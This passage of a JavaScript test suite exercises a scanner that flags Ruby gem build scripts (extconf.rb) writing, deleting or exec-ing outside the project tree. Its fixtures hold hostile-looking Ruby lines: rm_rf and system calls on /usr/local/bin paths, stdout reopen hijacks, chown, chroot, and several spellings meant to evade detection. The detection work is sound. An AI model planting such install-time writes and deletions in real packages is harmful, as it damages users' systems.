    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}@@ov = "/usr/local/bin/x"\nFile.write(@@ov, "y")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `@@cvar operand must enter the bareword lane and fail closed, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.match(t3[0]?.message ?? "", /unresolvable/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C11b (BLK-R3bF2-D: $0 builtin-global write operand ($0= is box-verified live on ruby 3.3.8) — outside the LHS grammar ⇒ unresolvable ⇒ fail-closed HIGH)", async () => {
  const findings = await stageGem("g-f2d2", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}$0 = "/usr/local/bin/x"\nFile.write($0, "y")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `$0 operand must enter the bareword lane and fail closed, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.match(t3[0]?.message ?? "", /unresolvable/u);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C3f (BLK-R3b-FIX2-E: heredoc RHS binding — BINH = <<~EOS is box-verified to hold the multi-line rooted value at File.write time, invisible to the line grammar ⇒ unresolvable ⇒ fail-closed HIGH)", async () => {
  const findings = await stageGem("g-f2e1", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}BINH = <<~EOS\n/usr/local/bin/heredoc-target\nEOS\nFile.write(BINH, "d")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `heredoc-bound operand must fail closed, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.match(t3[0]?.message ?? "", /heredoc|fail closed/iu);
  assert.equal(computeVerdict(findings), "FAIL");
});

// VERIFIER-REPORT-R3B-FIX3 round-4 blocker BLK-R3bF4-B (TDD RED-first): PAREN-LESS percent operands on
// the bare Kernel verbs — `system %q{…}` / `exec %q{…}` / `system %{…}` are box ruby 3.3.8 LIVE calls
// (payloads i4_pctq / i4b_pctbrace verbatim; liveness re-proved this round, see DONECLAIM) yet the bare
// arm's operand class ( [ " ' ) matched none of them ⇒ 0 rows ⇒ silent escape. The widen routes the
// paren-less payload through the SAME percent-expansion path the parened form already uses.
test("R3b-C12a (BLK-R3bF4-B: bare `system %q{/usr/local/bin/x}` — verifier payload i4_pctq verbatim — rooted arg visible through the percent-expanded span ⇒ exactly 1 HIGH)", async () => {
  const findings = await stageGem("g-f4b1", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %q{/usr/local/bin/x}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `paren-less system %q{{…}} rooted operand must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C12b (BLK-R3bF4-B: exec %q{/usr/local/bin/x} + system %{touch /tmp/y} (verifier i4_pctq/i4b_pctbrace spellings) ⇒ two HIGH rows, one per call)", async () => {
  const findings = await stageGem("g-f4b2", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}exec %q{/usr/local/bin/x}\nsystem %{touch /tmp/y}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `both paren-less percent verbs must row independently, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C12c (BLK-R3bF4-B FP guard: relative-operand percent literal `system %q{make clean}` stays ZERO rows — the widen must not turn every bare %q verb into a false alarm)", async () => {
  const findings = await stageGem("g-f4b3", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %q{make clean}\n`,
  });
  assert.equal(byRule(findings, "residue-out-of-tree-write").length, 0, `relative %q operand must stay confined, got ${JSON.stringify(findings.map((f) => f.message))}`);
});

// VERIFIER-REPORT-R3B-FIX4 blocker BLK-R3bF5-A (TDD RED-first): bare verb + `%x` with a NON-PAIRING
// delimiter. Box ruby 3.3.8 executes ALL four verbatim payloads live (marker files touched, re-proved
// 2026-09-09 — see DONECLAIM live_reproof). The old percent branch matched `system %`, so matchAll's
// lastIndex consumed the `%` and the dedicated `%x[^A-Za-z0-9\s]` arm could never re-fire on that text,
// AND the branch's span kept the `%x<delim>` prefix (unlike the %x arm's own payload-only slice), so the
// ROOTED `^`-anchor never saw the leading `/` ⇒ 0 rows ⇒ silent escape.
test("R3b-C13a (BLK-R3bF5-A: bare `system %x|/usr/local/bin/x|` — FIX4 payload verbatim — live-execs on box ruby ⇒ exactly 1 HIGH)", async () => {
  const findings = await stageGem("g-f5a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %x|/usr/local/bin/x|\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bare verb + %x pipe-delimiter must never silent-pass, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C13b (BLK-R3bF5-A: bare `system %x!/usr/local/bin/x!` — bang delimiter verbatim ⇒ exactly 1 HIGH)", async () => {
  const findings = await stageGem("g-f5b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %x!/usr/local/bin/x!\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bare verb + %x bang-delimiter must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C13c (BLK-R3bF5-A: bare `system %x%/usr/local/bin/x%` — percent delimiter verbatim ⇒ exactly 1 HIGH)", async () => {
  const findings = await stageGem("g-f5c", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %x%/usr/local/bin/x%\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bare verb + %x percent-delimiter must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C13d (BLK-R3bF5-A: bare `system %x@/usr/local/bin/x@` — at delimiter verbatim ⇒ exactly 1 HIGH)", async () => {
  const findings = await stageGem("g-f5d", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %x@/usr/local/bin/x@\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bare verb + %x at-delimiter must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.equal(t3[0]?.severity, "HIGH");
});

test("R3b-C13e (BLK-R3bF5-A SIBLING-CLASS pin: the fix is designator-agnostic — bare `system %w|/usr/local/bin/x y|` (2-element argv0 form, box-live rooted exec, marker live_w) + designator-less `system %|/usr/local/bin/x|` (string argv, box-live `system %|/bin/true| ⇒ true`) ⇒ two HIGH, one per call)", async () => {
  const findings = await stageGem("g-f5e", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system %w|/usr/local/bin/x y|\nsystem %|/usr/local/bin/x|\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `non-q/Q and designator-less non-pairing percent operands must row through the SAME percent path, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

// ROUND 8 (fix-8): the boundary class `[\s(\[{<]` is a CLOSED complement doctrine — the char set OUTSIDE
// it is a named invisible lane (§8 items (9)/(11)), NOT a silent one. These two pins are the machine
// proof of the complement matrix: every member stays 0-row today (silence contract) and any widening of
// the class flips them RED (VERIFIER-REPORT-R3B-FIX6 W4 method: adding `>` to the class moves
// `system "echo x>/usr/…"` 0→1, so each pinned 0 is a genuine tripwire, not a tautology).
test("R3b-C14a (closure/interpolation-tail adjacency stays SILENT — item (9) complement class): `File.write('#{p}/tmp/…', …)`, `File.write(\"a]/tmp/…\", …)`, `system \"run()/tmp/…\"` ⇒ 0 rows", async () => {
  const findings = await stageGem("g-r8c14a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.write('#{p}/tmp/r3b8_tailbrace', 'x')\nFile.write("a]/tmp/r3b8_tailbrk", "x")\nsystem "run()/tmp/r3b8_tailparen"\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 0, `closing-delimiter and interpolation-tail adjacency is the NAMED origin-only lane — the class must NOT shift, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
});

test("R3b-C14b (shell-metachar adjacency stays SILENT — item (11) complement class, round-8 family sweep): `system \"echo x>/tmp/…\"`, `\"echo x;/tmp/…\"`, `\"echo x>&/tmp/…\"` ⇒ 0 rows, while the string-START control `system \"/tmp/…\"` rows exactly 1", async () => {
  const findings = await stageGem("g-r8c14b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system "echo x>/tmp/r3b8_gt"\nsystem "echo x;/tmp/r3b8_semi"\nsystem "echo x>&/tmp/r3b8_gtamp"\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 0, `> ; >& adjacency is box-LIVE at the shell but origin-only silent — named invisible, class must NOT shift, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  const ctrl = await stageGem("g-r8c14bc", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}system "/tmp/r3b8_ctrl"\n`,
  });
  assert.equal(byRule(ctrl, "residue-out-of-tree-write").length, 1, "the rooted string-START control MUST row — silence there would mean the whole lane is broken");
});

// ROUND 8 blocker BLK-7 (VERIFIER-REPORT-R3B-FIX6): `$stdout.reopen("/tmp/evil_r7.log", "w")` was
// box-LIVE, silent AND UNNAMED — the fd-hijack write primitive. Round-8 doctrine: a FAMILY is swept
// exhaustively ONCE. C15a…C15h pin the complete Ruby write-primitive call-form roster (box liveness
// probed on ruby 3.3.8 2026-09-09, scratch-safe payloads); each newly-covered primitive was RED first.
test("R3b-C15a (BLK-7 fd-hijack family, box-live WRITES: `$stdout.reopen(\"/tmp/r3b8_outro\", \"w\")` + `$stderr.reopen(\"/tmp/r3b8_errro\", \"w\")` ⇒ two HIGH)", async () => {
  const findings = await stageGem("g-r8c15a", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}$stdout.reopen("/tmp/r3b8_outro", "w")\n$stderr.reopen("/tmp/r3b8_errro", "w")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `global-fd reopen with a rooted target must never silent-pass, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C15b (reopen family SPELLING matrix: `STDOUT.reopen` / `STDERR.reopen` / `$stdin.reopen` — the read-side hijack is in-family, §8 adjudication ⇒ three HIGH, dot-only receivers never double via the (?<![\\w.?]) guard)", async () => {
  const findings = await stageGem("g-r8c15b", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}STDOUT.reopen("/tmp/r3b8_OUTro", "w")\nSTDERR.reopen("/tmp/r3b8_ERRro", "w")\n$stdin.reopen("/tmp/r3b8_INro", "r")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 3, `stdout/stderr/stdin constant and $global reopen spellings must each consume exactly one match, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15c (sysopen family, box-live fd-writes: `File.sysopen(path, File::CREAT|File::WRONLY, 0o644)` + `File::sysopen(…)` colon form + `IO.sysopen(…)` ⇒ three HIGH, File::CREAT/WRONLY constants do NOT re-fire the File arm)", async () => {
  const findings = await stageGem("g-r8c15c", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.sysopen("/tmp/r3b8_fso", File::CREAT | File::WRONLY, 0o644)\nFile::sysopen("/tmp/r3b8_fso2", File::CREAT | File::WRONLY)\nIO.sysopen("/tmp/r3b8_iso", File::CREAT | File::WRONLY)\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 3, `sysopen dot/colon/IO spellings must row once each, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15d (IO content-writer family, box-live: `IO.write` + `IO.binwrite` + `IO.copy_stream(src, rooted-dest)` ⇒ three HIGH — IO.read stays OUT (read-only, C15h))", async () => {
  const findings = await stageGem("g-r8c15d", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}IO.write("/tmp/r3b8_iow", "x")\nIO.binwrite("/tmp/r3b8_iobw", "x")\nIO.copy_stream("build/src", "/tmp/r3b8_iocs")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 3, `IO.write/binwrite/copy_stream rooted forms must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15e (File-level create/metadata family, all box-live: mkfifo/truncate/utime/chown/lchmod/lchown/lutime = seven NEWLY-covered + symlink/link rooted second-arg = two already-rowing family sweeps ⇒ nine HIGH; ROUND-10 C15e 8→9 adds File.lutime — machine-table LIVE-UNCOVERED, lutimes(2), does NOT follow symlinks so it is strictly more deceptive than File.utime; sibling File.futime is NOT in the table: absent on box ruby 3.3.8, see §8 roster DEAD row)", async () => {
  const findings = await stageGem("g-r8c15e", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.mkfifo("/tmp/r3b8_fifo")\nFile.truncate("/tmp/r3b8_trunc", 0)\nFile.utime(Time.now, Time.now, "/tmp/r3b8_utime")\nFile.lutime(Time.now, Time.now, "/tmp/r3b10_lutime")\nFile.chown(Process.uid, Process.gid, "/tmp/r3b8_chown")\nFile.lchmod(0o600, "/tmp/r3b8_lchmod")\nFile.lchown(Process.uid, Process.gid, "/tmp/r3b8_lchown")\nFile.symlink("build/a", "/tmp/r3b8_sym2")\nFile.link("build/a", "/tmp/r3b8_link2")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 9, `every box-live File create/metadata primitive with a rooted operand must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15f (deletion class COVERED by adjudication — the FileUtils.rm_r/remove wildcard already priced deletion, so File.unlink/File.delete/Dir.rmdir/Dir.delete/Dir.unlink join the same lane, box-live ⇒ five HIGH; consistency, not a new severity; ROUND-10 C15f 3→5 adds the Dir.delete/Dir.unlink aliases that BLK-R3bF9-B caught silent)", async () => {
  const findings = await stageGem("g-r8c15f", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.unlink("/tmp/r3b8_unlink")\nFile.delete("/tmp/r3b8_delete")\nDir.rmdir("/tmp/r3b8_rmdir")\nDir.delete("/tmp/r3b10_ddel")\nDir.unlink("/tmp/r3b10_dunl")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 5, `rooted deletion primitives must row like their FileUtils wildcard twins, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15g (FP guard for the widened table: every NEW verb argued an IN-TREE operand stays confined — IO.write(\"build/…\"), File.unlink(\"build/tmp.o\"), $stdout.reopen(\"build/log.txt\"), File.chmod(mode, \"build/libfoo.so\"), Dir.rmdir(\"build/tmpd\"), File.mkfifo(\"build/fifo\") + ROUND-10 additions Dir.delete(\"build/tmpd2\"), File.lutime(mode-in-tree), File.copy_stream both in-tree, rm_f(\"build/tmp.o\"), xsystem(\"make clean\"), $>.reopen(\"build/log2.txt\") ⇒ 0 rows)", async () => {
  const findings = await stageGem("g-r8c15g", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}IO.write("build/out.o", "x")\nFile.unlink("build/tmp.o")\n$stdout.reopen("build/log.txt", "w")\nFile.chmod(0o755, "build/libfoo.so")\nDir.rmdir("build/tmpd")\nFile.mkfifo("build/fifo")\nDir.delete("build/tmpd2")\nFile.lutime(Time.now, Time.now, "build/f2")\nFile.copy_stream("build/a", "build/b")\nrm_f("build/tmp.o")\nxsystem("make clean")\n$>.reopen("build/log2.txt", "w")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 0, `the round-8/10 widen is operand-shaped, not verb-shaped — in-tree new-verb operands must stay silent, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
});

test("R3b-C15h (read-only primitives stay OUT of the write table by definition, rooted operands included — IO.read/Dir.entries/File.basename ⇒ 0 rows; the IO arm must not swallow readers)", async () => {
  const findings = await stageGem("g-r8c15h", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}IO.read("/tmp/r3b8_iord")\nDir.entries("/tmp/r3b8_ent")\nFile.basename("/tmp/r3b8_bas")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 0, `read-only call forms are excluded by definition, never by silence-accident, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
});

// ROUND 10 (BLK-R3bF9-A/B/C + M0 machine-table sweep, VERIFIER-REPORT-R3B-FIX7): the alias universe was
// DERIVED from the interpreter (evidence/residue-spike/ruby-alias-table-3.3.8.txt), not recalled, and
// every write/delete/metadata/reopen-family member got a box verdict (evidence/m1-box-probes-round10.txt,
// seam diff evidence/m1-seam-probe-{BEFORE,AFTER}.txt). C15a-bis/C15i/C15j pin the deltas RED-first.
test("R3b-C15a-bis (BLK-R3bF9-A: `$>` is $stdout's one-letter alias — $>.reopen(\"/tmp/r3b10_gt\", \"w\") dot form + `$>::reopen(...)` scope form + paren-less `$>.reopen \"/tmp/…\"` fail-closed form ⇒ three HIGH; the round-9 'closed at six members' reopen claim was WRONG, seven members after the machine walk)", async () => {
  const findings = await stageGem("g-r10c15abis", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}$>.reopen("/tmp/r3b10_gt", "w")\n$>::reopen("/tmp/r3b10_gt2", "w")\n$>.reopen "/tmp/r3b10_gt3", "w"\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 3, `$> reopen spellings must never silent-pass — box-proved $>.equal?($stdout)===true and the call materialized the rooted target, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3b-C15i (M0 sweep deltas on INHERITED receivers + colon spellings, box-live: File.copy_stream(\"build/a\", rooted-dst) + File.popen(\"/usr/local/bin/x\") argv0-exec (both reach File via IO's singleton — machine-table shows File's own singleton list lacks them, respond_to? proves inheritance) + `Dir::delete(...)` colon form ⇒ three HIGH; the 4th line FileUtils.rm_rf(rooted) re-asserts NO DOUBLE-PRICE once rm_rf joins the bare arm (dotted form stays exactly one row via the [\\w.] lookbehind) ⇒ total four)", async () => {
  const findings = await stageGem("g-r10c15i", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}File.copy_stream("build/a", "/tmp/r3b10_cs")\nFile.popen("/usr/local/bin/x")\nDir::delete("/tmp/r3b10_dd")\nFileUtils.rm_rf("/usr/local/bin/z")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 4, `inherited-receiver writers and the colon deletion spelling must row once each, dotted wildcards must not double-price, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});

test("R3b-C15j (M0 sweep deltas in the mkmf TOP-LEVEL + confinement-break class, box-live: bare rm_f/rm_rf/xsystem/xpopen are MakeMakefile module_functions promoted to extconf top-level privates by mkmf.rb:2890-2894 (source-proved; box lacks ruby-dev so require aborts early — mechanism simulated in the probe log) + Dir.chroot rooted = the CONFINEMENT BREAK itself (chroots the process; box EPERM non-root, operand-absolute-only) ⇒ five HIGH)", async () => {
  const findings = await stageGem("g-r10c15j", "n-gem-native", {
    "ext/ghost/extconf.rb": `${GOLDEN_EXTCONF}rm_rf("/tmp/r3b10_mrf")\nrm_f "/tmp/r3b10_mf"\nxsystem("touch /usr/local/bin/x")\nxpopen("/usr/local/bin/x")\nDir.chroot("/tmp/r3b10_jail")\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 5, `mkmf top-level delete/exec verbs and Dir.chroot with rooted operands must row, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.message}`))}`);
  assert.ok(t3.every((f) => f.severity === "HIGH"));
});
